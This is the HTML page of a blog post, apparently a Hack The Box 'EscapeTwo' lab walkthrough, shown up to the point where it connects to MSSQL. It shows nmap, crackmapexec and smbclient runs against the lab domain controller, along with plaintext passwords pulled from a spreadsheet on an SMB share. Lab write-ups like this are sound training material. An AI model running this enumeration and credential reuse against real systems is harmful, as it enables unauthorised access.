@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Muyi">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/08/16/hackthebox/htb-escapetwo/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/elmo-launch.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/elmo-launch.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/elmo-launch.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HTB-EscapeTwo | Muyi&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":5,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":false,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Blog for storing the knowledges I need (;","subtitle":{"text":["sudo echo \"subtitle goes here\""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/1/22 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Muyi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">37</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HTB-EscapeTwo</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/elmo.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Muyi</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-08-16 22:14:34</span>
+        <span class="mobile">2025-08-16 22:14:34</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-17 13:12:33</span>
+            <span class="mobile">2025-08-17 13:12:33</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Easy/">Easy</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Windows/">Windows</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<ol>
+<li><p>nmap [standard active directory]</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.94SVN scan initiated Sun Jan 12 14:05:14 2025 as: /usr/lib/nmap/nmap --privileged -sV -T5 -o nmap 10.10.11.51</span><br><span class="line">Nmap scan report for 10.10.11.51</span><br><span class="line">Host is up (0.018s latency).</span><br><span class="line">Not shown: 988 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-12 05:49:53Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Sun Jan 12 14:06:03 2025 -- 1 IP address (1 host up) scanned in 49.22 seconds</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>given user credentials –&gt; rose:KxEPkKe6R8su</p>
+<ul>
+<li>use it to perform crackmapexec on smb [crackmapexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su –shares]<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su --shares</span><br><span class="line">SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su</span><br><span class="line">SMB         10.10.11.51     445    DC01             [+] Enumerated shares</span><br><span class="line">SMB         10.10.11.51     445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.51     445    DC01             -----           -----------     ------</span><br><span class="line">SMB         10.10.11.51     445    DC01             Accounting Department READ</span><br><span class="line">SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.51     445    DC01             C$                              Default share</span><br><span class="line">SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share</span><br><span class="line">SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share</span><br><span class="line">SMB         10.10.11.51     445    DC01             Users           READ</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+</li>
+<li><p>access the smb shares via smbclient</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -U rose%KxEPkKe6R8su \\\\10.10.11.51\\&#x27;Accounting Department&#x27;</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Sun Jun  9 18:52:21 2024</span><br><span class="line">  ..                                  D        0  Sun Jun  9 18:52:21 2024</span><br><span class="line">  accounting_2024.xlsx                A    10217  Sun Jun  9 18:14:49 2024</span><br><span class="line">  accounts.xlsx                       A     6780  Sun Jun  9 18:52:07 2024</span><br><span class="line"></span><br><span class="line">                6367231 blocks of size 4096. 913240 blocks available</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>unzip both the xlsx</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 5 muyi muyi 4096 Jan 12 14:20  .</span><br><span class="line">drwxr-xr-x 5 muyi muyi 4096 Jan 12 21:44  ..</span><br><span class="line">-rw-r--r-- 1 muyi muyi 6780 Jan 12 14:10  accounts.xlsx</span><br><span class="line">-rw-r--r-- 1 muyi muyi 1735 Jun  9  2024 &#x27;[Content_Types].xml&#x27;</span><br><span class="line">drwxr-xr-x 2 muyi muyi 4096 Jan 12 14:11  docProps</span><br><span class="line">drwxr-xr-x 2 muyi muyi 4096 Jan 12 14:11  _rels</span><br><span class="line">drwxr-xr-x 5 muyi muyi 4096 Jan 12 14:13  xl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ ls -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x 5 muyi muyi 4096 Jan 12 14:13 .</span><br><span class="line">drwxr-xr-x 5 muyi muyi 4096 Jan 12 14:20 ..</span><br><span class="line">drwxr-xr-x 2 muyi muyi 4096 Jan 12 14:13 _rels</span><br><span class="line">-rw-r--r-- 1 muyi muyi 1271 Jun  9  2024 sharedStrings.xml</span><br><span class="line">-rw-r--r-- 1 muyi muyi 5593 Jun  9  2024 styles.xml</span><br><span class="line">drwxr-xr-x 2 muyi muyi 4096 Jan 12 14:11 theme</span><br><span class="line">-rw-r--r-- 1 muyi muyi  878 Jun  9  2024 workbook.xml</span><br><span class="line">drwxr-xr-x 3 muyi muyi 4096 Jan 12 14:11 worksheets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ xmllint --format sharedStrings.xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;sst xmlns=&quot;http://schemas.openxmlformats.org/spreadsheetml/2006/main&quot; count=&quot;25&quot; uniqueCount=&quot;24&quot;&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;First Name&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;Last Name&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;Email&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;Username&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;Password&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;Angela&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;Martin&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;angela@sequel.htb&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;angela&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;0fwz7Q4mSpurIt99&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;Oscar&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;Martinez&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;oscar@sequel.htb&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;oscar&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;86LxLBMgEWaKUnBG&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;Kevin&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;Malone&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;kevin@sequel.htb&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;kevin&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;Md9Wlq1E5bZnVDVo&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;NULL&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;sa@sequel.htb&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;sa&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">  &lt;si&gt;</span><br><span class="line">    &lt;t xml:space=&quot;preserve&quot;&gt;MSSQLP@ssw0rd!&lt;/t&gt;</span><br><span class="line">  &lt;/si&gt;</span><br><span class="line">&lt;/sst&gt;</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>gather the information and get the following results</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat creds</span><br><span class="line">rose:KxEPkKe6R8su</span><br><span class="line">angela:0fwz7Q4mSpurIt99</span><br><span class="line">oscar:86LxLBMgEWaKUnBG</span><br><span class="line">kevin:Md9Wlq1E5bZnVDVo</span><br><span class="line">sa:MSSQLP@ssw0rd!</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>using impacket-mssqlclient, establish connection with the sql server hosting on 1433</p>
